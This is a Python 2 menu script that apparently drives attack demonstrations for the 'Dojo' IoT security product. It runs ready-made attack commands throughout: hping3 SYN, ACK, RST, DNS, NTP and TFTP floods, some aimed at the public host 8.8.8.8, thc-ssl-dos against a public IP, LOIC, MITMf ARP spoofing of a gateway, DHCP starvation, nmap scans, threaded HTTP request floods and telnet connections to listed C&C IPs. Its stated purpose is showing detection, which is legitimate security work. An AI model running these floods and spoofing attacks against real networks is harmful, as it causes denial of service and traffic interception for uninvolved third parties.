#!/usr/bin/python

# - - - - - - -
# Imports
import socket
import sys
import time
import random
import colorama
import requests
import urllib
import subprocess
import cmd
# import pdb
import re
import telnetlib
import nmap
import os
import platform
import signal
import speedtest
import webbrowser
import atexit
import netifaces as ni
import argparse
from netaddr import IPNetwork
from time import sleep
from subprocess import PIPE, Popen, STDOUT
from threading import Timer
import threading

# - - - - - - -

# - - - - - - -
# Defines
ASCII_ART_WELCOME = """
  _____        _           _               ____        _ _                           _ 
 |  __ \      (_)         | |             |  _ \      | | |                         | |
 | |  | | ___  _  ___     | |__  _   _    | |_) |_   _| | | __ _ _   _  __ _ _ __ __| |
 | |  | |/ _ \| |/ _ \    | '_ \| | | |   |  _ <| | | | | |/ _` | | | |/ _` | '__/ _` |
 | |__| | (_) | | (_) |   | |_) | |_| |   | |_) | |_| | | | (_| | |_| | (_| | | | (_| |
 |_____/ \___/| |\___/    |_.__/ \__, |   |____/ \__,_|_|_|\__, |\__,_|\__,_|_|  \__,_|
             _/ |                 __/ |                     __/ |
            |__/                 |___/                     |___/
"""  # Big design
WELCOME_MESSAGE = "Hack and slash IoT by Rotem"
NORMAL_COLOR = 0
SUCCESS_COLOR = 1
DOING_SOMETHING = 2
FOSCAM_USER_NAME = "admin"
FOSCAM_USER_PASS = ""
INTERFACE = "wlp5s0"
#INTERFACE = "enp0s17"
ROUTER_MAC = "18:D6:C7:EE:EC:64"
ROUTER_ADDRESS = "10.0.0.1"
FOLDER = '/home/michaeloks/Desktop/gogo'


def query_yes_no(question, default="yes"):
    valid = {"yes": True, "y": True, "ye": True,
             "no": False, "n": False}
    if default is None:
        prompt = " [y/n] "
    elif default == "yes":
        prompt = " [Y/n] "
    elif default == "no":
        prompt = " [y/N] "
    else:
        raise ValueError("invalid default answer: '%s'" % default)

    while True:
        sys.stdout.write(question + prompt)
        choice = raw_input().lower()
        if default is not None and choice == '':
            return valid[default]
        elif choice in valid:
            return valid[choice]
        else:
            sys.stdout.write("Please respond with 'yes' or 'no' "
                             "(or 'y' or 'n').\n")


def color_cmd(scheme_type):
    colorama.init(autoreset=False)
    if SUCCESS_COLOR == scheme_type:
        sys.stdout.write(colorama.Style.BRIGHT)
        sys.stdout.write(colorama.Fore.GREEN)
        # sys.stdout.write(colorama.Back.GREEN)
    elif NORMAL_COLOR == scheme_type:
        sys.stdout.write(colorama.Style.BRIGHT)
        sys.stdout.write(colorama.Fore.WHITE)
        # sys.stdout.write(colorama.Back.BLACK)
    elif DOING_SOMETHING == scheme_type:
        sys.stdout.write(colorama.Style.BRIGHT)
        sys.stdout.write(colorama.Fore.YELLOW)
        # sys.stdout.write(colorama.Back.BLUE)


def url_encode(x):
    return urllib.quote(x)


verbose_mode = False


def printd(string, verbose=False):
    if verbose is False:  # if this is a plain error message, always print
        print (string)
    elif verbose is True and verbose_mode is True:  # if this is a verbose one, print only if we are in verbose mode
        print(string)

class DemoShell(cmd.Cmd):
    def __init__(self):
        cmd.Cmd.__init__(self)

        self.intro = "           Hack and slash for Dojo demo sessions!"
        self.prompt = "#>  "
        self.dos_process = ""
        self._print_help()
        if platform.system() == 'Windows':
            self.os = "Windows"
        else:
            self.os = "Linux"
        atexit.register(self.cleanup)
        self.current_proc = ""
        self.current_cmd_name = ""
        self.timer = ""

    def _print_help(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        print("\n\n[My Adress is %s]" % s.getsockname()[0])
        s.close()
        print "\nAvailable commands:\n" \
      "+  0 - quit             - Quit\n" \
      "+  1 - IDPS             - Botnet attacks simulator\n" \
      "+  2 - ssl validator    - SSL Validator demo attack\n" \
      "+  3 - Mirai detection -  Prevent mirai infection try\n" \
      "+  4 - speedtest        - Speedtest check\n" \
      "+  5 - block device     - Block selected device from access\n" \
      "+  6 - C&C URL          - Detect access try by URL\n" \
      "+  7 - C&C IP REP       - Detect access try by IP\n" \
      "+  8 - router access    - Router access prevention demonstration\n" \
      "+  9 - port scan        - Port scan attack\n" \
      "+ 10 - ping scan        - Ping scan attack\n" \
      "+ 11 - parental adult   - parental adult check\n" \
      "+ 12 - parental teen    - parental teenager check\n" \
      "+ 13 - parental child   - parental child check\n" \
      "+ 14 - port forwarding  - Device access over port forwarding and MFA\n" \
      "+ 15 - dhcp_starv       - DHCP Starvation attack\n" \
      "+ 16 - arp_spoofing     - ARP spoofing attack against GW\n" \
      "+ 17 - Vuln assessment  - Show Vulenerablity assesment\n" \
      "+ 18 - weak password    - Weak Password detection assessment\n" \
      "+ 19 - mic_seg          - Micro segmentation demonstration\n" \
      "+ 20 - DDoS GET Flood   - HTTP GET Flood to WAN (Snort)\n" \
      "+ 21 - DDoS POST Flood  - HTTP POST Flood to WAN (Snort)\n" \
      "+ 22 - DDoS SYN Flood   - SYN Flood - LAN to WAN (IPtables)\n" \
      "+ 23 - DDoS ACK Flood   - ACK Flood - LAN to WAN (IPtables)\n" \
      "+ 24 - DDoS SSL Flood   - HTTP SSL Flood LAN to WAN (IPtables)\n" \
      "+ 25 - DDoS DNS Flood   - UDP DNS Flood to WAN (IPtables)\n" \
      "+ 26 - DDoS NTP Flood   - UDP NTP Flood to WAN (IPtables)\n" \
      "+ 27 - DDoS TFTP Flood  - UDP TFTP Flood to WAN (IPtables)\n" \
      "+ 28 - DDoS HTTP Flood  - Layer 7 flood (IPtables)\n" \
      "+ 40 - [Internal Maint.]				\n"

    def cleanup(self):
        printd("cleanup called!", True)
        if self.current_proc != "":
            printd("[!] Program terminated, killing active background process (pid=%d):\n%s"
                   % (self.current_proc.pid, self.current_cmd_name), True)
            os.killpg(os.getpgid(self.current_proc.pid), signal.SIGTERM)
            self.current_cmd_name = ""
            self.current_proc = ""
        if self.timer != "":
            self.timer.cancel()
            self.timer = ""
        else:
            printd("[!] Program terminated, nothing to terminate", True)

    def execute(self, cmd, timeout=0):
        print "[+] Invoking %s" % cmd
        try:
            self.current_cmd_name = cmd
            if timeout <= 0:
                self.current_proc = os.system(cmd)
            else:  # This block manages the process' lifecycle, terminating it if timeout exceeded
                self.current_proc = subprocess.Popen(self.current_cmd_name, stdout=subprocess.PIPE, shell=True,
                                                     preexec_fn=os.setsid)

                self.timer = Timer(timeout, self.cleanup)
                self.timer.start()

                printd("[+] Waiting for the managed process to finish...", True)
                output = self.current_proc.communicate()
                if self.timer != "":  # it might have been cancelled in the cleanup function
                    self.timer.cancel()
                # We reached this point if either the process timed-out and we terminated it,
                # or if it finished its execution natively. In either case, communicate returned.
                """ 
                Keep this for debugging. when active, looks strange to print the program's output after it finished, 
                as it can take some time.             
                for line in output:
                    if line == '\n':
                        continue
                    print (line),  # comma at the end eliminates newline
                """
                printd("[+] The managed process finish its execution.", True)

                # if self.current_cmd_name != "":  # In case the process reached
                # os.killpg(os.getpgid(self.current_proc.pid), signal.SIGTERM)

        except Exception, e:
            print "[-] Failed to execute command! : ", e
        # pass

        # cleanup
        self.current_cmd_name = ""
        self.current_proc = ""

        printd("[+] the execution method has finished.", True)

    def do_idps(self, line):
        print "[+] Starting Botnets Simulations (IoT)\n\n"
        time.sleep(1.05)
        self.execute("ping -c 4 " + "213.183.53.120")
        self.execute("ping -c 4 " + "46.243.189.101")
        self.execute("ping -c 4 " + "198.51.100.123")
        #        os.system("ping -c 4 " + "213.183.53.120")
        #        os.system("ping -c 4 " + "46.243.189.101")
        #        os.system("ping -c 4 " + "198.51.100.123")
        print "[!]  Botnets Simulations finished!\n\n"
        self._print_help()

    def do_weak_password(self, line):
        print "[!] Show Weak password detection over Vulnerability assessment in Dojo Mobile APP!"
        time.sleep(1.05)
        self._print_help()

    def do_block_device(self, line):
        print "[!] Show device blocking in Dojo Mobile APP!"
        time.sleep(1.05)
        self._print_help()

    def do_botnet_detection(self):
        print "[!] Show Botnet detection from Browser! in http://mirai.dojo-labs.com (IoT)"
        self.open_url_in_browser("http://mirai.dojo-labs.com")
        time.sleep(1.05)
        self._print_help()

    def do_cNc_url(self):
        print "[!] Show Botnet detection from Browser! in http://rleas.com (Personal)"
        # self.make_url_request("http://rleas.com")
        self.open_url_in_browser("http://rleas.com")

        print "[!] Show Botnet detection from Browser! in https://malware.wicar.org (Personal)"
        # self.make_url_request("http://malware.wicar.org")
        self.open_url_in_browser("http://malware.wicar.org")

        self._print_help()

    def do_cNc_ip_rep(self):
        print "[+] Starting C&C IP reputation demo (personal)"
        # command = "telnet 80.15.74.9"
        # command = "telnet 23.237.120.26"
        command = "telnet 13.33.147.65"
        # command = "telnet 36.152.22.34"
        # command = "telnet 95.153.133.214"
        # command = "telnet 31.13.145.132"
        # command = "telnet 217.23.186.34"
        print "[+] executing %s" % command
        self.execute(command, timeout=10)
        print "[+] C&C IP reputation demo has been finished!\n"

        self._print_help()

    def start_ping_scan(self):
        print "[+] Starting Ping scan attack demo (personal || IoT)"
        command = "nmap -e %s -T5 -sP 192.168.102.0/24" % INTERFACE
        self.execute(command, timeout=10)
        print "[+] Ping Scan Attack has been finished!\n"
        self._print_help()

    def start_ssl_validator(self):
        print "[!] Show SSL validator in Dojo Mobile APP and Browser! (IoT)"
        # self.make_url_request("https://ssl3.dojo-labs.com")
        self.open_url_in_browser("https://ssl3.dojo-labs.com")

        self._print_help()

    def start_mic_segmentation(self):
        print "[!] Show micro segmentation in Dojo Mobile APP!"
        time.sleep(1.05)
        self._print_help()

    def start_arp_spoof(self):
        print ("[+] Starting ARP Spoofing attack over the network")
        command = "cd /home/michaeloks/Desktop/gogo/MITMf; python mitmf.py -i %s --spoof --arp --gateway 10.0.0.1" % INTERFACE
        self.execute(command, timeout=20)
        print "[+] ARP Attack has been finished!\n"
        #        try:
        # pro = subprocess.Popen("cd /home/demo/Desktop/MITMf; python mitmf.py -i %s --spoof --arp --gateway 192.168.101.160" % INTERFACE, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
        #            pro = subprocess.Popen("cd /home/demo/Desktop/MITMf; python mitmf.py -i %s --spoof --arp --gateway 10.0.0.1" % INTERFACE, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
        #            sleep(20)
        #            os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
        #            print "[+] ARP Attack has been finished!\n"
        #        except Exception, e:
        #            # print("[-] Failed to start ARP attack!")
        #            pass
        self._print_help()

    def start_dhcp_starv_attck(self):
        print "[+] Starting DHCP Starvation attack over the network"
        command = "dhcpstarv -i %s" % INTERFACE
        self.execute(command, timeout=20)
        print "[+] DHCP Starvation Attack has been finished!\n"

        self._print_help()

    def start_port_scan(self):
        print "[+] Starting Port scan attack demo (personal || IoT)"
        command = "nmap -e %s -n -Pn -p- -sU 8.8.8.8" % INTERFACE
        self.execute(command, timeout=20)
        print "[+] Port Scan Attack has been finished!\n"

        self._print_help()

    def start_router_access(self):
        print "[!] Show router access prevention in Dojo Mobile APP and Browser!"
        url = "http://10.0.0.1"
        print "[*] Attempting to access the router at %s" % url
        # self.make_url_request(url)
        self.open_url_in_browser(url)

        self._print_help()

    def start_port_forwarding(self):
        print "[!] Show MFA Port forwarding to managed device in Dojo Mobile APP and router! (port 80 on laptop)"
        time.sleep(1.05)
        self._print_help()

    def do_vuln_assessment(self, line):
        print "[!]  Show Vulnerability assessment our Dojo Mobile APP!"
        time.sleep(1.05)
        self._print_help()

    def flush_dns(self):
        command = "systemd-resolve --flush-cache"
        command_2 = "systemd-resolve --statistics"

        self.execute(command)
        self.execute(command_2)

        self._print_help()

    def start_speed_test(self):
        print "[!]  Start SpeedTest check, please wait until its done!\n"
        ni.ifaddresses(INTERFACE)
        ip = ni.ifaddresses(INTERFACE)[ni.AF_INET][0]['addr']
        s = speedtest.Speedtest(source_address=ip)
        s.get_servers()
        s.get_best_server()
        s.download()
        s.upload()
        s.results.share()

        res = s.results.dict()
        print " SpeedTest results: Download %s MB Upload %s MB ping %s ms" % (
        round(res["download"] / 1024 / 1024), round(res["upload"] / 1024 / 1024), round(res["ping"]))

        self._print_help()

    def open_url_in_browser(self, url, clear_cache=True):
        if self.os == 'Windows':
            self.execute("c:\\\"Program Files (x86)\"\\Google\\Chrome\\Application\\chrome.exe \"%s\"" % url)
        else:
            if clear_cache:
                self.flush_dns()
            # webbrowser.get("/usr/bin/google-chrome --no-sandbox %s &").open_new_tab(url)

            self.execute("/usr/bin/google-chrome --no-sandbox %s > /dev/null 2>&1 &" % url)
            # pro = subprocess.Popen("/usr/bin/google-chrome --no-sandbox %s > /dev/null 2>&1 &" % url, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)

    def make_url_request(self, url):
        print "[*] Issuing HTTP request to %s" % url

        try:
            response = requests.get(url, timeout=5)
        #		print "[*] Got response %s" % response
        except Exception, e:
            #		print "Request Failed or Timedout"
            pass

    def start_parental_adult(self):
        # self.make_url_request("https://malware.wicar.org")
        self.open_url_in_browser("http://malware.wicar.org")
        self._print_help()

    def start_parental_teen(self):
        # self.make_url_request("http://www.vodka.com")
        self.open_url_in_browser("http://www.vodka.com")
        self._print_help()

    def start_parental_child(self):
        # self.make_url_request("https://www.facebook.com")
        self.open_url_in_browser("https://www.facebook.com")
        self._print_help()

    def post_flood(self):
        #site = 'http://www.http.badssl.com/'
        #requests.post(site)
        os.system('''curl -X POST "http://httpbin.org/post" -H "accept: application/json"''')
        self._print_help()

    def get_flood(self):
        #site = 'http://http.badssl.com/'
        #requests.get(site)
        os.system('''curl -X GET "http://httpbin.org/get" -H "accept: application/json"''')
        self._print_help()

    def thread_get_flood_wan(self):
        number = 0
        for x in range(0, 199):
            print "request number", number
            t = threading.Thread(target=self.get_flood)
            number = number + 1
            t.start()
		
    def same_connection_get_wan_flood(self):
		# the space saperated target will make a reuse at the same connection
		#target_site_multi_string = "http://httpbin.org/get " * 200
		target_site_multi_string = "http://www.google.com " * 30
		get_command = 'curl -X GET %s -H "accept: application/json"' % (target_site_multi_string)
		#get_command = 'curl -m 0.1 -X GET %s -H "accept: application/json"' % (target_site_multi_string)
		os.system(get_command)
		self._print_help()

    def same_connection_post_wan_flood(self):
		# the space saperated target will make a reuse at the same connection
		#target_site_multi_string = "http://httpbin.org/get " * 200
		target_site_multi_string = "http://www.google.com " * 30
		get_command = 'curl -X POST %s -H "accept: application/json"' % (target_site_multi_string)
		#get_command = 'curl -m 0.1 -X POST %s -H "accept: application/json"' % (target_site_multi_string)
		os.system(get_command)
		self._print_help()	
		
    def thread_post_flood_wan(self):
        number = 0
        for x in range(0, 199):
            print "request number", number
            t = threading.Thread(target=self.post_flood)
            number = number + 1
            t.start()

    def syn_flood(self):
        syn_command = "hping3 -d aa --flood -p 1337 -S 8.8.8.8"
        os.system(syn_command)
        self._print_help()

    def ack_flood(self):
        syn_command = "hping3 --flood -d aa -p 1337 -A 8.8.8.8"
        os.system(syn_command)
        self._print_help()

    def ssl_flood(self):
        syn_command = FOLDER + "thc-tls-dos/src/thc-ssl-dos 184.26.130.117 --accept"
        os.system(syn_command)
        self._print_help()

    def dns_flood(self):
        syn_command = "hping3 --flood --udp --sign aa -p 53 8.8.8.8"
        print "Starting DNS Flood"
        os.system(syn_command)
        self._print_help()

    def rst_flood(self):
        rst_command = "sudo hping3 --flood -d aa -p 1337 -R 8.8.8.8"
        os.system(rst_command)
        self._print_help()

    def layer7_http(self):
        loic_command = "/home/michaeloks/Desktop/gogo/LOIC/loic.sh run"
        os.system(loic_command)
        print "run on https://www.google.com"
        self._print_help()

    def syn_local(self):
        syn_command = "hping3 -d aa --flood  -p 1337 -S 192.168.202.101"
        print "TCP SYN attack on 192.168.202.101"
        os.system(syn_command)
        self._print_help()

    def ack_local(self):
        syn_command = "hping3 --flood -d aa  -p 1337 -A 192.168.202.101"
        print "TCP ACK attack on 192.168.202.101"
        os.system(syn_command)
        self._print_help()

    def dns_local(self):
        syn_command = "hping3 --flood --udp --sign aa -p 53 192.168.202.101"
        print "Starting DNS Flood on 192.168.202.101"
        os.system(syn_command)
        self._print_help()

    def ntp_local(self):
        syn_command = "hping3 --flood --udp --sign aa -p 123 192.168.202.101"
        print "Starting NTP Flood on 192.168.202.101"
        os.system(syn_command)
        self._print_help()


    def ntp_flood(self):
        syn_command = "hping3 --flood --udp --sign aa -p 123 8.8.8.8"
        print "Starting NTP Flood on 8.8.8.8"
        os.system(syn_command)
        self._print_help()

    def tftp_local(self):
        syn_command = "hping3 --flood --udp --sign aa -p 69 192.168.202.101"
        print "Starting TFTP Flood on 192.168.202.101"
        os.system(syn_command)
        self._print_help()

    def tftp_flood(self):
        syn_command = "hping3 --flood --udp --sign aa -p 69 8.8.8.8"
        print "Starting TFTP Flood on 8.8.8.8"
        os.system(syn_command)
        self._print_help()

    def rst_local(self):
        rst_command = "sudo hping3 --faster -d aa -p 1337 -R 192.168.202.101"
        print "Starting RST Flood on 192.168.202.101"
        os.system(rst_command)
        self._print_help()


    def ssl_local(self):
        syn_command = FOLDER + "thc-tls-dos/src/thc-ssl-dos 192.168.202.101 --accept"
        os.system(syn_command)
        self._print_help()


    def get_local(self):
        site = 'http://192.168.201.101/'
        requests.get(site)
        self._print_help()


    def thread_get_local(self):
        number = 0
        for x in range(0, 199):
            print "request number", number
            t = threading.Thread(target=self.get_local)
            number = number + 1
            t.start()


    def post_local(self):
        site = 'http://192.168.201.101/'
        requests.post(site)
        self._print_help()


    def thread_post_local(self):
        number = 0
        for x in range(0, 199):
            print "request number", number
            t = threading.Thread(target=self.post_local)
            number = number + 1
            t.start()


    def do_0(self, line):
        self.do_quit("")

    def do_1(self, line):
        self.do_idps("")

    def do_2(self, line):
        self.start_ssl_validator()

    def do_3(self, line):
        self.do_botnet_detection()

    def do_4(self, line):
        self.start_speed_test()

    def do_5(self, line):
        self.do_block_device("")

    def do_6(self, line):
        self.do_cNc_url()

    def do_7(self, line):
        self.do_cNc_ip_rep()

    def do_8(self, line):
        self.start_router_access()

    def do_9(self, line):
        self.start_port_scan()

    def do_10(self, line):
        self.start_ping_scan()

    def do_11(self, line):
        self.start_parental_adult()

    def do_12(self, line):
        self.start_parental_teen()

    def do_13(self, line):
        self.start_parental_child()

    def do_14(self, line):
        self.start_port_forwarding()

    def do_15(self, line):
        self.start_dhcp_starv_attck()

    def do_16(self, line):
        self.start_arp_spoof()

    def do_17(self, line):
        self.do_vuln_assessment("")

    def do_18(self, line):
        self.do_weak_password("")

    def do_19(self, line):
        self.start_mic_segmentation()

    def do_20(self, line):
        self.same_connection_get_wan_flood()

    def do_21(self, line):
        self.same_connection_post_wan_flood()

    def do_22(self, line):
        self.syn_flood()

    def do_23(self, line):
        self.ack_flood()

    def do_24(self, line):
        self.ssl_flood()

    def do_25(self, line):
        self.dns_flood()

    def do_26(self, line):
        self.ntp_flood()

    def do_27(self, line):
        self.tftp_flood()

    def do_28(self, line):
        self.layer7_http()

    def do_40(self, line):
        self.flush_dns()

    def do_quit(self, line):
        print "[+] Thank you for Hacking with us! have a great Day"
        sys.exit(0)

    def do_help(self, line):
        self._print_help()


def parse_cmd():
    global INTERFACE
    global verbose_mode

    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--debug", help="Enabled verbose debug output", action="store_true", default=False)
    parser.add_argument("-i", "--interface", help="Specify the host local interface name", default=INTERFACE)
    args = parser.parse_args()

    verbose_mode = args.debug
    INTERFACE = args.interface

    printd("Initializing with debug mode = {}, local interface = {}".format(args.debug, args.interface), True)


def main():
    # random.seed()
    # print(chr(27) + "[2J")  # 1 clean screen
    # try:
    #     print subprocess.check_output("tail -n 150000 /bin/sh", shell=True).encode("hex")
    # except Exception, e:
    #     pass
    # print(chr(27) + "[2J")  # 1 clean screen

    parse_cmd()
    print "%s\n" % (ASCII_ART_WELCOME)
    demo_shell = DemoShell()
    try:
        demo_shell.cmdloop()
    except KeyboardInterrupt:
        print "Bye bye..."
        demo_shell.cleanup()

    return


if __name__ == "__main__":
    try:
        main()
    except Exception, e:
        print "Bad connection..."
        print e
